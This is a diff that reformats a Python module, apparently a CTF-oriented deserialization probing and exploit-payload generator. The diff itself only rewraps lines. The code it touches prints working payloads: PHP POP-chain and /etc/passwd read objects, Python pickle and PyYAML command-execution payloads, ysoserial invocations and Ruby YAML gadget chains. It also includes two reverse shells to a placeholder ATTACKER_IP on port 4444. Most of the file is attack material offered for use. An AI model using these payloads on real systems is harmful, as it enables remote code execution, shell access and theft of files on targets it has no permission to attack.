@@ -8,6 +8,7 @@ PHP, Python, Java, and .NET applications, and generating exploitation payloads.
 import json
 import re
 from typing import Dict, List, Optional, Tuple
+
 import requests
 
 
@@ -45,21 +46,39 @@ class DeserializationProbeTool:
 
     # Detection indicators by format
     PHP_INDICATORS: List[str] = [
-        "unserialize()", "O:4:", "O:8:", 's:N:"', "__wakeup", "__destruct", "a:N:{"
+        "unserialize()",
+        "O:4:",
+        "O:8:",
+        's:N:"',
+        "__wakeup",
+        "__destruct",
+        "a:N:{",
     ]
 
     PYTHON_INDICATORS: List[str] = [
-        "pickle", "unpickle", "cPickle", "__reduce__", "cos\nsystem", "\x80\x03"
+        "pickle",
+        "unpickle",
+        "cPickle",
+        "__reduce__",
+        "cos\nsystem",
+        "\x80\x03",
     ]
 
     JAVA_INDICATORS: List[str] = [
-        "rO0AB", "aced0005", "ObjectInputStream", "ClassNotFoundException",
-        "java.io.Serializable", "InvalidClassException"
+        "rO0AB",
+        "aced0005",
+        "ObjectInputStream",
+        "ClassNotFoundException",
+        "java.io.Serializable",
+        "InvalidClassException",
     ]
 
     DOTNET_INDICATORS: List[str] = [
-        "__VIEWSTATE", "ObjectStateFormatter", "LosFormatter",
-        "BinaryFormatter", "AAEAAAD"
+        "__VIEWSTATE",
+        "ObjectStateFormatter",
+        "LosFormatter",
+        "BinaryFormatter",
+        "AAEAAAD",
     ]
 
     # Malformed payloads per format for error differential testing
@@ -88,7 +107,12 @@ class DeserializationProbeTool:
 
     # Flag patterns to check for in responses
     FLAG_PATTERNS: List[str] = [
-        "flag{", "FLAG{", "CTF{", "ctf{", "picoCTF{", "HTB{",
+        "flag{",
+        "FLAG{",
+        "CTF{",
+        "ctf{",
+        "picoCTF{",
+        "HTB{",
     ]
 
     def __init__(self, session: Optional[requests.Session] = None):
@@ -123,7 +147,9 @@ class DeserializationProbeTool:
             )
 
         try:
-            return self._probe_deserialization(url, param, method, extra_data, fmt, timeout)
+            return self._probe_deserialization(
+                url, param, method, extra_data, fmt, timeout
+            )
         except requests.RequestException as e:
             return f"[DeserializationProbeTool] Request error: {e}"
         except Exception as e:
@@ -182,15 +208,11 @@ class DeserializationProbeTool:
         results["body"] = self._check_indicators(response.text, indicators)
 
         # Scan cookies
-        cookie_str = "; ".join(
-            f"{k}={v}" for k, v in response.cookies.items()
-        )
+        cookie_str = "; ".join(f"{k}={v}" for k, v in response.cookies.items())
         results["cookies"] = self._check_indicators(cookie_str, indicators)
 
         # Scan headers
-        header_str = " ".join(
-            f"{k}: {v}" for k, v in response.headers.items()
-        )
+        header_str = " ".join(f"{k}: {v}" for k, v in response.headers.items())
         results["headers"] = self._check_indicators(header_str, indicators)
 
         return results
@@ -228,9 +250,7 @@ class DeserializationProbeTool:
             baseline_text = baseline.text
             baseline_len = len(baseline_text)
             baseline_status = baseline.status_code
-            results.append(
-                f"Status: {baseline_status}, Length: {baseline_len} bytes"
-            )
+            results.append(f"Status: {baseline_status}, Length: {baseline_len} bytes")
         except Exception as e:
             return f"[DeserializationProbeTool] Error: Could not fetch baseline response: {e}"
 
@@ -310,11 +330,19 @@ class DeserializationProbeTool:
 
                     # Check for deserialization-specific error messages
                     deser_errors = [
-                        "unserialize", "deserializ", "unpickl", "pickle",
-                        "ObjectInputStream", "ClassNotFound",
-                        "InvalidClass", "StreamCorrupted",
-                        "BinaryFormatter", "SerializationException",
-                        "TypeError", "ValueError", "EOFError",
+                        "unserialize",
+                        "deserializ",
+                        "unpickl",
+                        "pickle",
+                        "ObjectInputStream",
+                        "ClassNotFound",
+                        "InvalidClass",
+                        "StreamCorrupted",
+                        "BinaryFormatter",
+                        "SerializationException",
+                        "TypeError",
+                        "ValueError",
+                        "EOFError",
                     ]
                     error_in_resp = [
                         e for e in deser_errors if e.lower() in resp.text.lower()
@@ -466,24 +494,52 @@ class DeserializationPayloadGenerator:
         result.append("=== POP Chain Templates ===")
         result.append("")
         result.append("--- __wakeup Magic Method ---")
-        result.append('O:8:"Exploiter":1:{s:4:"cmd";s:' + str(len(command)) + ':"' + command + '";}')
-        result.append("Note: __wakeup() is called automatically when unserialize() is invoked.")
+        result.append(
+            'O:8:"Exploiter":1:{s:4:"cmd";s:'
+            + str(len(command))
+            + ':"'
+            + command
+            + '";}'
+        )
+        result.append(
+            "Note: __wakeup() is called automatically when unserialize() is invoked."
+        )
         result.append("")
 
         result.append("--- __destruct Magic Method ---")
-        result.append('O:10:"FileWriter":2:{s:8:"filename";s:9:"/tmp/pwnd";s:4:"data";s:' + str(len(command)) + ':"' + command + '";}')
-        result.append("Note: __destruct() is called when the object is destroyed (end of script).")
+        result.append(
+            'O:10:"FileWriter":2:{s:8:"filename";s:9:"/tmp/pwnd";s:4:"data";s:'
+            + str(len(command))
+            + ':"'
+            + command
+            + '";}'
+        )
+        result.append(
+            "Note: __destruct() is called when the object is destroyed (end of script)."
+        )
         result.append("")
 
         result.append("--- __toString Magic Method ---")
-        result.append('O:9:"Formatter":1:{s:6:"output";s:' + str(len(command)) + ':"' + command + '";}')
-        result.append("Note: __toString() is called when the object is used as a string.")
+        result.append(
+            'O:9:"Formatter":1:{s:6:"output";s:'
+            + str(len(command))
+            + ':"'
+            + command
+            + '";}'
+        )
+        result.append(
+            "Note: __toString() is called when the object is used as a string."
+        )
         result.append("")
 
         # File read
         result.append("=== File Read Payload ===")
-        result.append('O:13:"SplFileObject":1:{s:8:"\\x00*\\x00file";s:11:"/etc/passwd";}')
-        result.append("Note: SplFileObject can read files when deserialized in some PHP versions.")
+        result.append(
+            'O:13:"SplFileObject":1:{s:8:"\\x00*\\x00file";s:11:"/etc/passwd";}'
+        )
+        result.append(
+            "Note: SplFileObject can read files when deserialized in some PHP versions."
+        )
         result.append("")
 
         # CMS gadget chain references
@@ -504,8 +560,10 @@ class DeserializationPayloadGenerator:
 
         # Serialized object format
         result.append("=== PHP Serialization Format Reference ===")
-        result.append("O:N:\"ClassName\":P:{properties}  - Object with N-char class name, P properties")
-        result.append("s:N:\"value\"                      - String of length N")
+        result.append(
+            'O:N:"ClassName":P:{properties}  - Object with N-char class name, P properties'
+        )
+        result.append('s:N:"value"                      - String of length N')
         result.append("i:N                               - Integer N")
         result.append("b:0 / b:1                         - Boolean false/true")
         result.append("a:N:{key;value;...}               - Array with N elements")
@@ -513,9 +571,13 @@ class DeserializationPayloadGenerator:
         result.append("")
 
         result.append("=== Tips ===")
-        result.append("1. Use phpggc (https://github.com/ambionics/phpggc) for framework-specific chains")
+        result.append(
+            "1. Use phpggc (https://github.com/ambionics/phpggc) for framework-specific chains"
+        )
         result.append("2. Look for unserialize() calls in source code")
-        result.append("3. PHP 7+ restricts some __wakeup exploitation via CVE-2016-7124 bypass")
+        result.append(
+            "3. PHP 7+ restricts some __wakeup exploitation via CVE-2016-7124 bypass"
+        )
         result.append("4. Check for phar:// deserialization (no unserialize() needed)")
 
         return "\n".join(result)
@@ -549,14 +611,18 @@ class DeserializationPayloadGenerator:
         result.append("=== Pre-built Base64 Pickle Payloads ===")
         result.append("")
         result.append(f"--- Command: {command} ---")
-        result.append("Generate with: python3 -c \"import pickle,base64,os; "
-                       f"print(base64.b64encode(pickle.dumps(type('X',(),{{'__reduce__':lambda s:(os.system,('{command}',))}})())).decode())\"")
+        result.append(
+            'Generate with: python3 -c "import pickle,base64,os; '
+            f"print(base64.b64encode(pickle.dumps(type('X',(),{{'__reduce__':lambda s:(os.system,('{command}',))}})())).decode())\""
+        )
         result.append("")
         result.append("--- Command: id ---")
         result.append("gASVHgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==")
         result.append("")
         result.append("--- Command: whoami ---")
-        result.append("Generate: python3 -c \"import pickle,base64,os; print(base64.b64encode(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('whoami',))})())).decode())\"")
+        result.append(
+            "Generate: python3 -c \"import pickle,base64,os; print(base64.b64encode(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('whoami',))})())).decode())\""
+        )
         result.append("")
 
         # YAML deserialization
@@ -566,7 +632,9 @@ class DeserializationPayloadGenerator:
         result.append(f"!!python/object/apply:os.system ['{command}']")
         result.append("")
         result.append("--- !!python/object/new:subprocess.check_output ---")
-        result.append(f"!!python/object/new:subprocess.check_output [['{command}'], {{shell: true}}]")
+        result.append(
+            f"!!python/object/new:subprocess.check_output [['{command}'], {{shell: true}}]"
+        )
         result.append("")
         result.append("--- !!python/object/apply:subprocess.check_output ---")
         result.append(f"!!python/object/apply:subprocess.check_output [['{command}']]")
@@ -596,9 +664,13 @@ class DeserializationPayloadGenerator:
         result.append("    def __reduce__(self):")
         result.append("        return (os.system, (")
         result.append("            'python3 -c \\'import socket,subprocess,os;'")
-        result.append("            's=socket.socket();s.connect((\"ATTACKER_IP\",4444));'")
+        result.append(
+            "            's=socket.socket();s.connect((\"ATTACKER_IP\",4444));'"
+        )
         result.append("            'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'")
-        result.append("            'os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])\\'',))")
+        result.append(
+            '            \'os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\\\'\',))'
+        )
         result.append("")
         result.append("print(base64.b64encode(pickle.dumps(RevShell())).decode())")
         result.append("```")
@@ -609,7 +681,9 @@ class DeserializationPayloadGenerator:
         result.append("")
         result.append("class Exploit:")
         result.append("    def __reduce__(self):")
-        result.append(f"        return (subprocess.check_output, (['{command}'], {{'shell': True}}))")
+        result.append(
+            f"        return (subprocess.check_output, (['{command}'], {{'shell': True}}))"
+        )
         result.append("")
         result.append("print(base64.b64encode(pickle.dumps(Exploit())).decode())")
         result.append("```")
@@ -620,7 +694,9 @@ class DeserializationPayloadGenerator:
         result.append("")
         result.append("class Exploit:")
         result.append("    def __reduce__(self):")
-        result.append(f"        return (eval, (\"__import__('os').popen('{command}').read()\",))")
+        result.append(
+            f"        return (eval, (\"__import__('os').popen('{command}').read()\",))"
+        )
         result.append("")
         result.append("print(base64.b64encode(pickle.dumps(Exploit())).decode())")
         result.append("```")
@@ -635,7 +711,9 @@ class DeserializationPayloadGenerator:
         result.append("2. Check for yaml.load() without Loader=SafeLoader")
         result.append("3. Look for base64-encoded blobs in cookies or form fields")
         result.append("4. jsonpickle and shelve are also vulnerable")
-        result.append("5. Some apps use pickle protocol 0 (text) vs 2+ (binary) — try both")
+        result.append(
+            "5. Some apps use pickle protocol 0 (text) vs 2+ (binary) — try both"
+        )
         result.append("6. If pickle is filtered, try cpickle or _pickle module names")
 
         return "\n".join(result)
@@ -675,7 +753,7 @@ class DeserializationPayloadGenerator:
         result.append(f"java -jar ysoserial.jar Groovy1 '{command}'")
         result.append(f"java -jar ysoserial.jar BeanShell1 '{command}'")
         result.append(f"java -jar ysoserial.jar Jdk7u21 '{command}'")
-        result.append(f"java -jar ysoserial.jar URLDNS 'http://callback.example.com'")
+        result.append("java -jar ysoserial.jar URLDNS 'http://callback.example.com'")
         result.append("")
 
         # Serialization format structure
@@ -685,7 +763,9 @@ class DeserializationPayloadGenerator:
         result.append("  [magic] [version] [class descriptor] [object data]")
         result.append("")
         result.append("Class Descriptor:")
-        result.append("  TC_OBJECT (0x73) + TC_CLASSDESC (0x72) + class name + serialVersionUID")
+        result.append(
+            "  TC_OBJECT (0x73) + TC_CLASSDESC (0x72) + class name + serialVersionUID"
+        )
         result.append("")
 
         # Detection
@@ -698,11 +778,18 @@ class DeserializationPayloadGenerator:
 
         result.append("=== Tips ===")
         result.append("1. Download ysoserial: https://github.com/frohoff/ysoserial")
-        result.append("2. Try URLDNS first (no dependency needed) to confirm deserialization")
+        result.append(
+            "2. Try URLDNS first (no dependency needed) to confirm deserialization"
+        )
         result.append("3. Use ysoserial-modified for newer chains")
-        result.append("4. Check for Java serialization in cookies, JMX, RMI, T3 protocol")
-        result.append("5. Base64 encode output: java -jar ysoserial.jar CommonsCollections1 '"
-                       + command + "' | base64")
+        result.append(
+            "4. Check for Java serialization in cookies, JMX, RMI, T3 protocol"
+        )
+        result.append(
+            "5. Base64 encode output: java -jar ysoserial.jar CommonsCollections1 '"
+            + command
+            + "' | base64"
+        )
 
         return "\n".join(result)
 
@@ -719,13 +806,17 @@ class DeserializationPayloadGenerator:
         result.append("--- yaml.load() without SafeLoader (pre-6.0) ---")
         result.append(f"!!python/object/apply:os.system ['{command}']")
         result.append("")
-        result.append(f"!!python/object/apply:subprocess.check_output [['{command}'], {{shell: true}}]")
+        result.append(
+            f"!!python/object/apply:subprocess.check_output [['{command}'], {{shell: true}}]"
+        )
         result.append("")
         result.append(f"!!python/object/new:subprocess.check_output [['{command}']]")
         result.append("")
         result.append("--- Reverse shell via YAML ---")
         result.append("!!python/object/apply:os.system")
-        result.append("- 'python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"ATTACKER\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"'")
+        result.append(
+            '- \'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\\"ATTACKER\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])"\''
+        )
         result.append("")
         result.append("--- File read via YAML ---")
         result.append("!!python/object/apply:builtins.open")
@@ -735,7 +826,9 @@ class DeserializationPayloadGenerator:
         result.append("--- Bypass SafeLoader fallback ---")
         result.append("!!python/object/apply:os.popen")
         result.append(f"- '{command}'")
-        result.append("# Only works with yaml.load(data, Loader=yaml.Loader) or yaml.unsafe_load()")
+        result.append(
+            "# Only works with yaml.load(data, Loader=yaml.Loader) or yaml.unsafe_load()"
+        )
         result.append("")
 
         # SnakeYAML (Java)
@@ -771,7 +864,9 @@ class DeserializationPayloadGenerator:
         result.append("  !ruby/object:Gem::Package::TarReader")
         result.append("  io: &1 !ruby/object:Net::BufferedIO")
         result.append("    io: &1 !ruby/object:Gem::Package::TarReader::Entry")
-        result.append(f'       read: 0\n       header: "abc"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module \'Kernel\'\n               method_id: :system\n           git_set: {command}')
+        result.append(
+            f"       read: 0\n       header: \"abc\"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module 'Kernel'\n               method_id: :system\n           git_set: {command}"
+        )
         result.append("")
         result.append("--- ERB-based (Ruby) ---")
         result.append("--- !ruby/object:Gem::Installer")
@@ -786,15 +881,21 @@ class DeserializationPayloadGenerator:
         result.append("- File extension: .yml, .yaml")
         result.append("- Configuration file upload features")
         result.append("- API endpoints accepting YAML input")
-        result.append("- Error messages containing 'yaml', 'YAML', 'SnakeYAML', 'Psych'")
+        result.append(
+            "- Error messages containing 'yaml', 'YAML', 'SnakeYAML', 'Psych'"
+        )
         result.append("")
         result.append("=== Tips ===")
         result.append("1. PyYAML yaml.load() is dangerous without Loader=SafeLoader")
-        result.append("2. PyYAML 6.0+ defaults to SafeLoader (yaml.load requires Loader param)")
+        result.append(
+            "2. PyYAML 6.0+ defaults to SafeLoader (yaml.load requires Loader param)"
+        )
         result.append("3. SnakeYAML allows arbitrary class instantiation by default")
         result.append("4. For SnakeYAML, host a malicious .jar on your server")
         result.append("5. Ruby YAML deserialization varies heavily by Ruby version")
-        result.append("6. Some apps convert YAML->JSON — try YAML-specific constructors")
+        result.append(
+            "6. Some apps convert YAML->JSON — try YAML-specific constructors"
+        )
 
         return "\n".join(result)
 
@@ -809,8 +910,12 @@ class DeserializationPayloadGenerator:
         result.append("=== Identifying Serialization Format ===")
         result.append("")
         result.append("--- Magic Bytes / Signatures ---")
-        result.append("PHP:    Starts with O:N: (object) or a:N:{ (array) or s:N: (string)")
-        result.append("Python: Base64 decode starts with \\x80\\x03 or \\x80\\x04 (pickle protocol)")
+        result.append(
+            "PHP:    Starts with O:N: (object) or a:N:{ (array) or s:N: (string)"
+        )
+        result.append(
+            "Python: Base64 decode starts with \\x80\\x03 or \\x80\\x04 (pickle protocol)"
+        )
         result.append("Java:   Base64 starts with rO0AB or hex starts with aced0005")
         result.append(".NET:   Starts with AAEAAAD or contains __VIEWSTATE")
         result.append("")
@@ -820,7 +925,9 @@ class DeserializationPayloadGenerator:
         result.append("")
         result.append("--- Cookies ---")
         result.append("PHP:  Look for O:N: patterns in cookie values")
-        result.append("Python: Look for base64-encoded blobs (decode and check for pickle magic)")
+        result.append(
+            "Python: Look for base64-encoded blobs (decode and check for pickle magic)"
+        )
         result.append("Java: Look for rO0AB in cookie values")
         result.append(".NET: Look for __VIEWSTATE hidden field or cookie")
         result.append("")
@@ -829,11 +936,15 @@ class DeserializationPayloadGenerator:
         result.append("Common names: viewstate, data, state, session, token")
         result.append("")
         result.append("--- URL Parameters ---")
-        result.append("Look for base64-encoded or URL-encoded serialized objects in query strings")
+        result.append(
+            "Look for base64-encoded or URL-encoded serialized objects in query strings"
+        )
         result.append("")
         result.append("--- Request Body ---")
         result.append("Check POST body for serialized data")
-        result.append("Content-Type may indicate format (application/x-java-serialized-object)")
+        result.append(
+            "Content-Type may indicate format (application/x-java-serialized-object)"
+        )
         result.append("")
 
         # Indicators by format
@@ -841,21 +952,29 @@ class DeserializationPayloadGenerator:
         result.append("")
         result.append("--- PHP ---")
         result.append("Error messages: unserialize(), __wakeup, __destruct")
-        result.append("Data pattern: O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";...}")
+        result.append('Data pattern: O:4:"User":2:{s:4:"name";s:5:"admin";...}')
         result.append("Look for: phar:// wrapper usage, phpggc references")
         result.append("")
         result.append("--- Python ---")
         result.append("Error messages: pickle, unpickle, __reduce__, cPickle")
-        result.append("Data pattern: Base64 blob that decodes to bytes starting with \\x80")
+        result.append(
+            "Data pattern: Base64 blob that decodes to bytes starting with \\x80"
+        )
         result.append("Look for: pickle.loads(), yaml.load(), jsonpickle")
         result.append("")
         result.append("--- Java ---")
-        result.append("Error messages: ObjectInputStream, ClassNotFoundException, InvalidClassException")
+        result.append(
+            "Error messages: ObjectInputStream, ClassNotFoundException, InvalidClassException"
+        )
         result.append("Data pattern: rO0AB (base64) or aced0005 (hex)")
-        result.append("Look for: Content-Type application/x-java-serialized-object, RMI/JNDI endpoints")
+        result.append(
+            "Look for: Content-Type application/x-java-serialized-object, RMI/JNDI endpoints"
+        )
         result.append("")
         result.append("--- .NET ---")
-        result.append("Error messages: BinaryFormatter, ObjectStateFormatter, SerializationException")
+        result.append(
+            "Error messages: BinaryFormatter, ObjectStateFormatter, SerializationException"
+        )
         result.append("Data pattern: AAEAAAD (base64), __VIEWSTATE field")
         result.append("Look for: ViewState, TypeNameHandling in JSON.NET config")
         result.append("")
@@ -865,6 +984,8 @@ class DeserializationPayloadGenerator:
         result.append("2. Modify serialized data and observe error messages")
         result.append("3. Use Burp Suite's Java Deserialization Scanner extension")
         result.append("4. Check for known CVEs in the application's framework")
-        result.append("5. Test with benign payloads first (DNS/HTTP callback) before RCE")
+        result.append(
+            "5. Test with benign payloads first (DNS/HTTP callback) before RCE"
+        )
 
         return "\n".join(result)
